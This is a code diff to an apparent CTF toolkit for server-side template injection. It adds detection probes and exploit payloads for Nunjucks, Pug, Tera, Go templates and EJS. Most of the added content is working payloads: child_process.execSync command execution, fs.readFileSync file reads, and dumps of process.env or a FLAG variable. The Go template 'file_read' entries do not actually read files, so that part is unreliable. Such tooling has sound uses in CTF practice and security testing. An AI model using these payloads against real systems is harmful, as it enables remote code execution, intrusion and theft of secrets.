@@ -1,7 +1,8 @@
 """
 SSTI (Server-Side Template Injection) detection tools for CTF solving.
 
-Provides utilities for detecting and exploiting template injection vulnerabilities.
+Provides utilities for detecting and exploiting template injection vulnerabilities
+across 16+ template engines including Nunjucks, Pug, Tera, Go templates, and EJS.
 """
 
 import json
@@ -103,6 +104,25 @@ class SstiProbeTool:
             ("[[${7*7}]]", "49", "Thymeleaf (Java)"),
             ("[(${7*7})]", "49", "Thymeleaf (Java)"),
         ],
+        "nunjucks": [
+            ("{{7*7}}", "49", "Nunjucks (Node.js)"),
+            ("{{range.constructor('return 7*7')()}}", "49", "Nunjucks (Node.js)"),
+            ("{{range.constructor('return this')()}}", "object", "Nunjucks (Node.js)"),
+        ],
+        "pug": [
+            ("#{7*7}", "49", "Pug (Node.js)"),
+            ("!{7*7}", "49", "Pug unescaped (Node.js)"),
+        ],
+        "tera": [
+            ("{{ 7 * 7 }}", "49", "Tera (Rust)"),
+        ],
+        "go_template": [
+            ("{{printf \"%d\" 49}}", "49", "Go html/template"),
+            ("{{7}}", "7", "Go html/template"),
+        ],
+        "ejs": [
+            ("<%=7*7%>", "49", "EJS (Node.js)"),
+        ],
     }
 
     # RCE exploit suggestions per engine
@@ -137,6 +157,15 @@ class SstiProbeTool:
         "mako": [
             "<%! import os %>${os.popen('id').read()}",
             "${__import__('os').popen('id').read()}",
+        ],
+        "nunjucks": [
+            "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
+        ],
+        "pug": [
+            "-var x = global.process.mainModule.require('child_process').execSync('id')\n=x",
+        ],
+        "ejs": [
+            "<%=global.process.mainModule.require('child_process').execSync('id')%>",
         ],
     }
 
@@ -513,6 +542,51 @@ class SstiExploitSuggester:
             "info": [
                 "{{this}}",
                 "{{this.constructor}}",
+            ],
+        },
+        "pug": {
+            "rce": [
+                "-var x = global.process.mainModule.require('child_process').execSync('{cmd}')\n={{x}}",
+                "- var require = global.process.mainModule.require\n- var exec = require('child_process').execSync\n= exec('{cmd}')",
+            ],
+            "file_read": [
+                "- var fs = global.process.mainModule.require('fs')\n= fs.readFileSync('{file}', 'utf8')",
+            ],
+            "info": [
+                "#{process.env}",
+                "#{process.cwd()}",
+                "#{JSON.stringify(process.env)}",
+            ],
+        },
+        "tera": {
+            "info": [
+                "{{{{ get_env(name='PATH') }}}}",
+                "{{{{ get_env(name='FLAG') }}}}",
+                "{{{{ get_env(name='HOME') }}}}",
+            ],
+        },
+        "go_template": {
+            "file_read": [
+                "{{{{.}}}}",
+                '{{{{$f := "/etc/passwd"}}}}{{{{$f}}}}',
+            ],
+            "info": [
+                "{{{{.}}}}",
+                "{{{{printf \"%v\" .}}}}",
+            ],
+        },
+        "ejs": {
+            "rce": [
+                "<%=global.process.mainModule.require('child_process').execSync('{cmd}')%>",
+                "<%- global.process.mainModule.require('child_process').execSync('{cmd}') %>",
+            ],
+            "file_read": [
+                "<%=global.process.mainModule.require('fs').readFileSync('{file}','utf8')%>",
+            ],
+            "info": [
+                "<%=process.env%>",
+                "<%=process.cwd()%>",
+                "<%=JSON.stringify(process.env)%>",
             ],
         },
     }
